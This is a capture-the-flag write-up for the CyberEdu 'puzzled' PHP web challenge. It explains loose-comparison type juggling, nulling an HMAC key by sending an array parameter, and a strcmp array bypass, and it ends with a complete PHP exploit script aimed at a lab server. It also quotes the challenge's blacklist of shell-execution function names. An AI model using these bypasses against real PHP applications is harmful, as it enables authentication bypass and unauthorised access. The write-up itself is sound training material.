+++
date = '2026-01-18'
draft = false
title = 'CyberEdu puzzled Writeup'
ShowToc = true
tags = ["CyberEdu", "web"]
+++


## Challenge overview

How puzzled can you get with php?

---

I really didn't feel like doing php challenges but I did it anyways.

## Identifying the vulnerabilities

We get a `php` source file with what looks like login. If we don't provide a pass, the source gets leaked.

```php
if (isset($_GET['pass'])){
    $pass = generateRandomString(95);
    $user_input = json_decode($_GET['pass']);
    if ($pass != $user_input->pass) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }
```

They generate a random 95 letter long password, decode the json of our `pass`, and hit us with a 403 if the password isn't correct. But the comparison is done with `!=`, not `!==`. For example, `5!="5"` would return false, while `5!=="5"` would return true. 

So we can bypass this by the php `"string" == 0` vulnerability.

The next part: 

```php
if ($user_input->token != $secret_token) {;
    echo strlen($secret_token);
    header('HTTP/1.0 403 Forbidden');
    exit;
}
```

If we get the token wrong, we get the length of it. 

Next, we can provide a `key` parameter, which becomes the result of `hash_hmac('ripemd160', param_key, secret_token)`.

```php
$key = $secret_token;
if (isset($_GET['key'])) {
    $key = hash_hmac('ripemd160', $_GET['key'], $secret_token); 
}

$hash = hash_hmac('ripemd160', $user_input->check, $key);

if ($hash !== $user_input->hash) {
    header('HTTP/1.0 403 Forbidden');
    exit;
}
```

If we don't get the hash right, we get another 403. 

Then, a blacklist:
```php
$black = ['system', 'exec', 'eval', 'php', 'passthru', 'open', 'assert', '`', 'preg_replace', 'e(', 'n(', '$', '(', '%', '=', '%28'];
```

And then - unserialize!

```php
$login = unserialize($user_input->check);
```

And finally, after we get admin, to finally get the flag, we need to bypass this:

```php
if($admin){
    if (isset($_GET['something'])) {
        if (strcmp($_GET['something'], $secret_token) == 0) {
            echo $flag;
        } else {
            echo 'Try Harder!';
        }
    }
}
```

Our pass gets json decoded into `$user_input`. So we need to pass `pass` (haha) as a parameter containing the json values `$user_input->pass`, `$user_input->token`, `$user_input->check`, `$user_input->hash`, and then also pass the `key` as a param.

This *ripemd160* is just a 160-bit or 40-hex-char long [HMAC](https://abhaybhargav.medium.com/security-engineer-interview-questions-whats-an-hmac-aaf6406e5897) (Hash-based Message Authentication Code). 

HMACs combine a secret key, a message and a hash function to produce a signature. A HMAC should be called like this: `hmac(algo, data, key)`.

What they've done is a bad idea because we control a lot of stuff.

`$key = HMAC(secret token, key_param)` OR `$key = $secret_token` THEN

`$hash = HMAC($user_input->check, $key)` 

where `result = HMAC(key, message)`.

I sent a placeholder for a pass json with `"pass": 0` and it bypassed the check! We get back the secret token length:

![challenge-screenshot](len.png#center)

This didn't work on token though. Instead, I used  `GET /?pass={"pass": 0,"token": true,"check": "","hash": ""}` and just got a 403. But we still need to get hash. It doesn't have a loose comparison (!=) like the other ones, so what do we do?

So we need another way to figure secret_token out, or control the hash.

---

Learning about this felt so dreadful to me I put this aside for two days. I even started doing math, just to delay finishing this. But now I'm back. 

I found another great source about HMACs [here](https://blog.gitguardian.com/hmac-secrets-explained-authentication/). Another one about [php vulns](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/php-tricks-esp).

The most important thing we can do while solving these challenges is learn about the underlying mechanisms. 

---

Although it's possible to force a hash_hmac('ripemd160', **null**, key), that wouldn't help us that much. Instead, what would is sending a null key!

I got stuck around here, so I found [this helpful writeup](https://jorgectf.github.io/blog/post/cyberedu-web-challenges/#puzzled). The solution this guy found to sending a null key was making it an empty array.

```python
pass:
    pass: 0
    token: true
    check: 
        user: true
        pass: true
    hash: hash_hmac('ridemd160', check, key)
key[]: ''
```

Since `key` is going to be null, we can calculate the hash ourselves. And keep in mind, `check` is a serialized php object: `$login = unserialize($user_input->check);`

We can start working on a script in php, since it would be easier than trying to do it in python. Finally no more 403, but we still have one last step, which is the *something* param. 

```php
if (strcmp($_GET['something'], $secret_token) == 0) {
            echo $flag;
```

The same bypass that worked for key, worked for this - sending it as a null array - and we finally get the flag! 

Here is the final version of the script:

```php
<?php

$url = "http://34.40.105.109:32124";

$login_data = [
	'user' => true,
	'pass' => true
];

$check = serialize($login_data);
$empty_key = '';
$hash = hash_hmac('ripemd160', $check, $empty_key);

$json_payload = [
	'pass' => 0,
	'token' => true,
	'check' => $check,
	'hash' => $hash
];

$pass_param = json_encode($json_payload);

$params = [
	'pass' => $pass_param,
	'key[]' => '',
	'something[]' => ''
];

$full_url = $url . '?' . http_build_query($params);
$response = file_get_contents($full_url);
echo "\n[+] Response:\n$response\n";

?>
```

![challenge-screenshot](flag.png#center)

---

I also uploaded the full code [here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/puzzled.php)!




